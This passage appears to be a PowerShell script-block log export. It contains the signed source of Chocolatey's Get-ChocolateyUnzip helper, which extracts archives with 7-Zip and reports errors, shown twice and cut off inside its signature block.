$env:ChocolateyPackageFolder if (!(Test-Path -path $packagelibPath)) { New-Item $packagelibPath -type directory } $zipFilename=split-path $zipfileFullPath -Leaf $zipExtractLogFullPath= Join-Path $packagelibPath $zipFilename`.txt } if ($env:chocolateyPackageName -ne $null -and $env:chocolateyPackageName -eq $env:ChocolateyInstallDirectoryPackage) { Write-Warning ""Install Directory override not available for zip packages at this time.`n If this package also runs a native installer using Chocolatey`n functions, the directory will be honored."" } Write-Host ""Extracting $bitnessMessage$zipfileFullPath to $destination..."" if (![System.IO.Directory]::Exists($destination)) { [System.IO.Directory]::CreateDirectory($destination) | Out-Null } $7zip = Join-Path ""$helpersPath"" '..\tools\7z.exe' if (!([System.IO.File]::Exists($7zip))) { Update-SessionEnvironment $7zip = Join-Path ""$env:ChocolateyInstall"" 'tools\7z.exe' } $7zip = [System.IO.Path]::GetFullPath($7zip) Write-Debug ""7zip found at `'$7zip`'"" # 32-bit 7z would not find C:\Windows\System32\config\systemprofile\AppData\Local\Temp, # because it gets translated to C:\Windows\SysWOW64\... by the WOW redirection layer. # Replace System32 with sysnative, which does not get redirected. # 32-bit 7z is required so it can see both architectures if ([IntPtr]::Size -ne 4) { $fileFullPathNoRedirection = $zipfileFullPath -ireplace ([System.Text.RegularExpressions.Regex]::Escape([Environment]::GetFolderPath('System'))),(Join-Path $Env:SystemRoot 'SysNative') $destinationNoRedirection = $destination -ireplace ([System.Text.RegularExpressions.Regex]::Escape([Environment]::GetFolderPath('System'))),(Join-Path $Env:SystemRoot 'SysNative') } else { $fileFullPathNoRedirection = $zipfileFullPath $destinationNoRedirection = $destination } $params = ""x -aoa -bd -bb1 -o`""$destinationNoRedirection`"" -y `""$fileFullPathNoRedirection`"""" if ($specificfolder) { $params += "" `""$specificfolder`"""" } Write-Debug ""Executing command ['$7zip' $params]"" # Capture 7z's output into a StringBuilder and write it out in blocks, to improve I/O performance. $global:zipFileList = New-Object System.Text.StringBuilder $global:zipDestinationFolder = $destination # Redirecting output slows things down a bit. $writeOutput = { if ($EventArgs.Data -ne $null) { $line = $EventArgs.Data Write-Verbose ""$line"" if ($line.StartsWith(""- "")) { $global:zipFileList.AppendLine($global:zipDestinationFolder + ""\"" + $line.Substring(2)) } } } $writeError = { if ($EventArgs.Data -ne $null) { Write-Error ""$($EventArgs.Data)"" } } $process = New-Object System.Diagnostics.Process $process.EnableRaisingEvents = $true Register-ObjectEvent -InputObject $process -SourceIdentifier ""LogOutput_ChocolateyZipProc"" -EventName OutputDataReceived -Action $writeOutput | Out-Null Register-ObjectEvent -InputObject $process -SourceIdentifier ""LogErrors_ChocolateyZipProc"" -EventName ErrorDataReceived -Action $writeError | Out-Null $process.StartInfo = new-object System.Diagnostics.ProcessStartInfo($7zip, $params) $process.StartInfo.RedirectStandardOutput = $true $process.StartInfo.RedirectStandardError = $true $process.StartInfo.UseShellExecute = $false $process.StartInfo.WorkingDirectory = Get-Location $process.StartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden $process.StartInfo.CreateNoWindow = $true $process.Start() | Out-Null if ($process.StartInfo.RedirectStandardOutput) { $process.BeginOutputReadLine() } if ($process.StartInfo.RedirectStandardError) { $process.BeginErrorReadLine() } $process.WaitForExit() # For some reason this forces the jobs to finish and waits for # them to do so. Without this it never finishes. Unregister-Event -SourceIdentifier ""LogOutput_ChocolateyZipProc"" Unregister-Event -SourceIdentifier ""LogErrors_ChocolateyZipProc"" # sometimes the process hasn't fully exited yet. for ($loopCount=1; $loopCount -le 15; $loopCount++) { if ($process.HasExited) { break; } Write-Debug ""Waiting for 7z.exe process to exit - $loopCount/15 seconds""; Start-Sleep 1; } $exitCode = $process.ExitCode $process.Dispose() Set-PowerShellExitCode $exitCode Write-Debug ""Command ['$7zip' $params] exited with `'$exitCode`'."" if ($zipExtractLogFullPath) { Set-Content $zipExtractLogFullPath $global:zipFileList.ToString() -Encoding UTF8 -Force } Write-Debug ""7z exit code: $exitCode"" $errorMessageAddendum = "" This is most likely an issue with the '$env:chocolateyPackageName' package and not with Chocolatey itself. Please follow up with the package maintainer(s) directly."" switch ($exitCode) { 0 { break } 1 { throw 'Some files could not be extracted.' + $errorMessageAddendum } # this one is returned e.g. for access denied errors 2 { throw '7-Zip encountered a fatal error while extracting the files.' + $errorMessageAddendum } 7 { throw ('7-Zip command line error.' + $errorMessageAddendum) } 8 { throw '7-Zip out of memory.' + $errorMessageAddendum } 255 { throw 'Extraction cancelled by the user.' + $errorMessageAddendum } default { throw ""7-Zip signalled an unknown error (code $exitCode)"" + $errorMessageAddendum} } $env:ChocolateyPackageInstallLocation = $destination return $destination } # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCDl7UF34Z4O7bJl # J2k4Fq6w3RZugnxsmdjzMLvixJbal6CCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUx","MessageNumber: 1 ¦ MessageTotal: 2 ¦ Path: C:\ProgramData\chocolatey\helpers\functions\Get-ChocolateyUnzip.ps1 ¦ ScriptBlockId: 33eb1f4e-529c-4805-afac-35d0be6847f0 ¦ ScriptBlockText: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2015 - 2017 RealDimensions Software, LLC # Copyright © 2011 - 2015 RealDimensions Software, LLC & original authors/contributors from https://github.com/chocolatey/chocolatey # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. function Get-ChocolateyUnzip { <# .SYNOPSIS Unzips an archive file and returns the location for further processing. .DESCRIPTION This unzips files using the 7-zip command line tool 7z.exe. Supported archive formats are listed at: https://sevenzip.osdn.jp/chm/general/formats.htm Prior to 0.9.10.1, 7za.exe was used. Supported archive formats for 7za.exe are: 7z, lzma, cab, zip, gzip, bzip2, and tar. .INPUTS None .OUTPUTS Returns the passed in $destination. .NOTES If extraction fails, an exception is thrown. If you are embedding files into a package, ensure that you have the rights to redistribute those files if you are sharing this package publicly (like on the community feed). Otherwise, please use Install-ChocolateyZipPackage to download those resources from their official distribution points. Starting in 0.9.10, will automatically call Set-PowerShellExitCode to set the package exit code based on 7-zip's exit code. .PARAMETER FileFullPath This is the full path to the zip file. If embedding it in the package next to the install script, the path will be like `""$(Split-Path -Parent $MyInvocation.MyCommand.Definition)\\file.zip""` In 0.10.1+, `File` is an alias for FileFullPath. This can be a 32-bit or 64-bit file. This is mandatory in earlier versions of Chocolatey, but optional if FileFullPath64 has been provided. .PARAMETER FileFullPath64 Full file path to a 64-bit native installer to run. Available in 0.10.4+. If embedding in the package, you can get it to the path with `""$(Split-Path -parent $MyInvocation.MyCommand.Definition)\\INSTALLER_FILE""` Provide this when you want to provide both 32-bit and 64-bit installers or explicitly only a 64-bit installer (which will cause a package install failure on 32-bit systems). .PARAMETER Destination This is a directory where you would like the unzipped files to end up. If it does not exist, it will be created. .PARAMETER SpecificFolder OPTIONAL - This is a specific directory within zip file to extract. .PARAMETER PackageName OPTIONAL - This will faciliate logging unzip activity for subsequent uninstalls .PARAMETER IgnoredArguments Allows splatting with arguments that do not apply. Do not use directly. .EXAMPLE > # Path to the folder where the script is executing $toolsDir = (Split-Path -parent $MyInvocation.MyCommand.Definition) Get-ChocolateyUnzip -FileFullPath ""c:\someFile.zip"" -Destination $toolsDir .LINK Install-ChocolateyZipPackage #> param( [alias(""file"")][parameter(Mandatory=$false, Position=0)][string] $fileFullPath, [parameter(Mandatory=$true, Position=1)][string] $destination, [parameter(Mandatory=$false, Position=2)][string] $specificFolder, [parameter(Mandatory=$false, Position=3)][string] $packageName, [alias(""file64"")][parameter(Mandatory=$false)][string] $fileFullPath64, [parameter(ValueFromRemainingArguments = $true)][Object[]] $ignoredArguments ) Write-FunctionCallLogMessage -Invocation $MyInvocation -Parameters $PSBoundParameters $bitnessMessage = '' $zipfileFullPath=$fileFullPath if ((Get-ProcessorBits 32) -or $env:ChocolateyForceX86 -eq 'true') { if (!$fileFullPath) { throw ""32-bit archive is not supported for $packageName""; } if ($fileFullPath64) { $bitnessMessage = '32-bit '; } } elseif ($fileFullPath64) { $zipfileFullPath = $fileFullPath64 $bitnessMessage = '64-bit ' } if ($zipfileFullPath -eq '' -or $zipfileFullPath -eq $null) { throw 'Package parameters incorrect, either FileFullPath or FileFullPath64 must be specified.' } if ($packageName) { $packagelibPath = $env:ChocolateyPackageFolder if (!(Test-Path -path $packagelibPath)) { New-Item $packagelibPath -type directory } $zipFilename=split-path $zipfileFullPath -Leaf $zipExtractLogFullPath= Join-Path $packagelibPath $zipFilename`.txt } if ($env:chocolateyPackageName -ne $null -and $env:chocolateyPackageName -eq $env:ChocolateyInstallDirectoryPackage) { Write-Warning ""Install Directory override not available for zip packages at this time.`n If this package also runs a native installer using Chocolatey`n functions, the directory will be honored."" } Write-Host ""Extracting $bitnessMessage$zipfileFullPath to $destination..."" if (![System.IO.Directory]::Exists($destination)) { [System.IO.Directory]::CreateDirectory($destination) | Out-Null } $7zip = Join-Path ""$helpersPath"" '..\tools\7z.exe' if (!([System.IO.File]::Exists($7zip))) { Update-SessionEnvironment $7zip = Join-Path ""$env:ChocolateyInstall"" 'tools\7z.exe' } $7zip = [System.IO.Path]::GetFullPath($7zip) Write-Debug ""7zip found at `'$7zip`'"" # 32-bit 7z would not find C:\Windows\System32\config\systemprofile\AppData\Local\Temp, # because it gets translated to C:\Windows\SysWOW64\... by the WOW redirection layer. # Replace System32 with sysnative, which does not get redirected. # 32-bit 7z is required so it can see both architectures if ([IntPtr]::Size -ne 4) { $fileFullPathNoRedirection = $zipfileFullPath -ireplace ([System.Text.RegularExpressions.Regex]::Escape([Environment]::GetFolderPath('System'))),(Join-Path $Env:SystemRoot 'SysNative') $destinationNoRedirection = $destination -ireplace ([System.Text.RegularExpressions.Regex]::Escape([Environment]::GetFolderPath('System'))),(Join-Path $Env:SystemRoot 'SysNative') } else { $fileFullPathNoRedirection = $zipfileFullPath $destinationNoRedirection = $destination } $params = ""x -aoa -bd -bb1 -o`""$destinationNoRedirection`"" -y `""$fileFullPathNoRedirection`"""" if ($specificfolder) { $params += "" `""$specificfolder`"""" } Write-Debug ""Executing command ['$7zip' $params]"" # Capture 7z's output into a StringBuilder and write it out in blocks, to improve I/O performance. $global:zipFileList = New-Object System.Text.StringBuilder $global:zipDestinationFolder = $destination # Redirecting output slows things down a bit. $writeOutput = { if ($EventArgs.Data -ne $null) { $line = $EventArgs.Data Write-Verbose ""$line"" if ($line.StartsWith(""- "")) { $global:zipFileList.AppendLine($global:zipDestinationFolder + ""\"" + $line.Substring(2)) } } } $writeError = { if ($EventArgs.Data -ne $null) { Write-Error ""$($EventArgs.Data)"" } } $process = New-Object System.Diagnostics.Process $process.EnableRaisingEvents = $true Register-ObjectEvent -InputObject $process -SourceIdentifier ""LogOutput_ChocolateyZipProc"" -EventName OutputDataReceived -Action $writeOutput | Out-Null Register-ObjectEvent -InputObject $process -SourceIdentifier ""LogErrors_ChocolateyZipProc"" -EventName ErrorDataReceived -Action $writeError | Out-Null $process.StartInfo = new-object System.Diagnostics.ProcessStartInfo($7zip, $params) $process.StartInfo.RedirectStandardOutput = $true $process.StartInfo.RedirectStandardError = $true $process.StartInfo.UseShellExecute = $false $process.StartInfo.WorkingDirectory = Get-Location $process.StartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden $process.StartInfo.CreateNoWindow = $true $process.Start() | Out-Null if ($process.StartInfo.RedirectStandardOutput) { $process.BeginOutputReadLine() } if ($process.StartInfo.RedirectStandardError) { $process.BeginErrorReadLine() } $process.WaitForExit() # For some reason this forces the jobs to finish and waits for # them to do so. Without this it never finishes. Unregister-Event -SourceIdentifier ""LogOutput_ChocolateyZipProc"" Unregister-Event -SourceIdentifier ""LogErrors_ChocolateyZipProc"" # sometimes the process hasn't fully exited yet. for ($loopCount=1; $loopCount -le 15; $loopCount++) { if ($process.HasExited) { break; } Write-Debug ""Waiting for 7z.exe process to exit - $loopCount/15 seconds""; Start-Sleep 1; } $exitCode = $process.ExitCode $process.Dispose() Set-PowerShellExitCode $exitCode Write-Debug ""Command ['$7zip' $params] exited with `'$exitCode`'."" if ($zipExtractLogFullPath) { Set-Content $zipExtractLogFullPath $global:zipFileList.ToString() -Encoding UTF8 -Force } Write-Debug ""7z exit code: $exitCode"" $errorMessageAddendum = "" This is most likely an issue with the '$env:chocolateyPackageName' package and not with Chocolatey itself. Please follow up with the package maintainer(s) directly."" switch ($exitCode) { 0 { break } 1 { throw 'Some files could not be extracted.' + $errorMessageAddendum } # this one is returned e.g. for access denied errors 2 { throw '7-Zip encountered a fatal error while extracting the files.' + $errorMessageAddendum } 7 { throw ('7-Zip command line error.' + $errorMessageAddendum) } 8 { throw '7-Zip out of memory.' + $errorMessageAddendum } 255 { throw 'Extraction cancelled by the user.' + $errorMessageAddendum } default { throw ""7-Zip signalled an unknown error (code $exitCode)"" + $errorMessageAddendum} } $env:ChocolateyPackageInstallLocation = $destination return $destination } # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCDl7UF34Z4O7bJl # J2k4Fq6w3RZugnxsmdjzMLvixJbal6CCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # 